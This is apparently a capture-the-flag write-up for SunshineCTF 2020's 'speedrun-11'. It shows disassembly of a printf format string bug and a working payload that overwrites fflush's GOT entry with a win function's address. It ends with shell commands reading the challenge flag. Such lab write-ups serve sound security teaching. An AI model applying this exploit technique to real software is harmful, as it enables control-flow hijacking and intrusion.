# speedrun-11

## Task

nc chal.2020.sunshinectf.org 30011

File: chall_11

Tags: binary exploitation, format string vulnerability

## Solution

In the `sym.vuln` function we now can see a format string vulnerability.

```nasm
[0x080483d0]> pdf@sym.vuln
            ; CALL XREF from main @ 0x80485bb
┌ 97: sym.vuln ();
│           ; var char *format @ ebp-0xd0
│           ; var int32_t var_4h @ ebp-0x4
│           0x08048511      55             push ebp
│           0x08048512      89e5           mov ebp, esp
│           0x08048514      53             push ebx
│           0x08048515      81ecd4000000   sub esp, 0xd4
│           0x0804851b      e800ffffff     call sym.__x86.get_pc_thunk.bx
│           0x08048520      81c3e8130000   add ebx, 0x13e8
│           0x08048526      8b83fcffffff   mov eax, dword [ebx - 4]
│           0x0804852c      8b00           mov eax, dword [eax]
│           0x0804852e      83ec04         sub esp, 4
│           0x08048531      50             push eax                    ; FILE *stream
│           0x08048532      68c7000000     push 0xc7                   ; 199 ; int size
│           0x08048537      8d8530ffffff   lea eax, [format]
│           0x0804853d      50             push eax                    ; char *s
│           0x0804853e      e83dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x08048543      83c410         add esp, 0x10
│           0x08048546      83ec0c         sub esp, 0xc
│           0x08048549      8d8530ffffff   lea eax, [format]
│           0x0804854f      50             push eax                    ; const char *format
│           0x08048550      e80bfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08048555      83c410         add esp, 0x10
│           0x08048558      8b83fcffffff   mov eax, dword [ebx - 4]
│           0x0804855e      8b00           mov eax, dword [eax]
│           0x08048560      83ec0c         sub esp, 0xc
│           0x08048563      50             push eax                    ; FILE *stream
│           0x08048564      e807feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x08048569      83c410         add esp, 0x10
│           0x0804856c      90             nop
│           0x0804856d      8b5dfc         mov ebx, dword [var_4h]
│           0x08048570      c9             leave
└           0x08048571      c3             ret
```

We read in a format and use that as the first argument for `printf`. If we use formatting characters like `%x` or `%p` it will print out stack data since it hase no more parameters initialized.

First we need to find our offset:

```bash
$ python2 -c "print('\nAAAABBBB'+'%x '*60)" | ./chall_11
So indeed
AAAABBBBc7 f7f2a580 8048520 0 0 41414141 42424242 25207825 78252078 ....
```

If you don't know how format string exploits work, this is a great explanation: https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

So we can write to the address in value 6 `0x41414141` with the counter in `%n`.

To get in control of the flow we are going to write the address of the `win` function into the `reloc.fflush` address so that we jump there when `sym.imp.fflush` is first called.

Since the address in `reloc.fflush` starts with `0x0804` as our `win` function does we only have to write 2 bytes. (`win` at `0x080484e6`)

We can do that by writing our first 4 bytes, then enough chars to increase the value written by `%n` (8 bytes written, 0x84e6 - 8). We can do that with `%x34022`.

Then we use `%6$hn` to write the integer into the address in value 6.

`\x18\x99\x04\x08%34022x%6$hn'`

Then we can pipe that together with a cat (to keep the input open) to the server:

(python2 -c "print('\n'+payload)";cat) | nc chal.2020.sunshinectf.org 30011

And get the flag:

```
ls
chall_11
flag.txt
cat flag.txt
sun{afterlife-4b74753c2b12949f}
```
